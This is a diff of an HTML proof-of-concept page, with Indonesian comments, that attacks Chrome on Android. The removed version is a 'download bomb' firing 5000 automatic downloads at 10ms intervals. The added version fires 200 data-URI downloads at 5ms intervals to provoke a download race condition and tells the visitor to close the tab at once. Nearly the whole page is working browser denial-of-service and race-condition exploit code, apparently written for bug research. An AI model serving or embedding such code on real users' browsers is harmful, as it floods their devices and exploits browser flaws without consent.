@@ -1,62 +1,41 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chrome Android DOS Test - PoC 2</title>
+    <title>Race Condition PoC - Chrome Android</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; text-align: center; background: #121212; color: #eee; }
-        .card { background: #1e1e1e; padding: 30px; border-radius: 15px; border: 1px solid #333; }
-        .btn-stress {
-            background: #d93025; color: white; padding: 20px;
-            border: none; border-radius: 10px; font-weight: bold;
-            width: 100%; font-size: 1.1rem; cursor: pointer;
-        }
-        .status { margin-top: 20px; font-family: monospace; color: #0f0; }
+        body { font-family: sans-serif; padding: 20px; text-align: center; }
+        .box { border: 2px solid #333; padding: 20px; border-radius: 10px; }
+        #status { color: red; font-weight: bold; margin: 10px; }
     </style>
 </head>
 <body>
-
-    <div class="card">
-        <h1>⚠️ Stress Test Lab</h1>
-        <p>Memicu 50+ download dengan jeda 10ms.<br>Perhatikan responsivitas navigasi Chrome.</p>
-        
-        <button class="btn-stress" onclick="startStressTest()">
-            LAUNCH DOWNLOAD BOMB
-        </button>
-
-        <div id="log" class="status">Status: Ready</div>
+    <div class="box">
+        <h2>Chrome Android Download Race Condition</h2>
+        <p>Instruksi: Klik tombol, lalu <b>SEGERA TUTUP TAB INI</b> dalam 1-2 detik.</p>
+        <button id="startBtn" style="padding: 15px; font-size: 1.2rem;">START INJECTION</button>
+        <div id="status">Status: Idle</div>
     </div>
 
     <script>
-        function startStressTest() {
-            const logDiv = document.getElementById('log');
-            const totalFiles = 5000; // Jumlah file untuk mencoba overload UI
+        document.getElementById('startBtn').onclick = function() {
+            const total = 200; // Cukup 200 untuk bukti, jangan 5000 lagi biar aman
+            document.getElementById('status').innerText = "INJECTING... CLOSE TAB NOW!";
             
-            logDiv.innerText = "Status: Launching...";
-
-            for (let i = 1; i <= totalFiles; i++) {
+            for (let i = 1; i <= total; i++) {
                 setTimeout(() => {
                     const link = document.createElement('a');
-                    
-                    // Menggunakan data unik tiap iterasi agar tidak dianggap file yang sama
-                    const content = `Stress Test File Ke-${i} - Time: ${Date.now()}`;
-                    link.href = "data:application/octet-stream;base64," + btoa(content);
-                    link.download = `attack_log_${i}.bin`;
+                    // Data URI kecil agar cepat masuk ke antrean OS
+                    link.href = "data:text/plain;base64,UG9DIFJhY2UgQ29uZGl0aW9u";
+                    link.download = `evidence_file_${i}.txt`;
                     
                     document.body.appendChild(link);
                     link.click();
                     document.body.removeChild(link);
-
-                    logDiv.innerText = `Status: Sent ${i}/${totalFiles}`;
                     
-                    if (i === totalFiles) {
-                        logDiv.innerText = "Status: All triggers sent. Check UI Response.";
-                    }
-                }, i * 10); // Jeda 10ms (Sangat Cepat)
+                    console.log(`Triggered: ${i}`);
+                }, i * 5); // Jeda sangat rapat (5ms) untuk memicu race condition
             }
-        }
+        };
     </script>
-
 </body>
 </html>
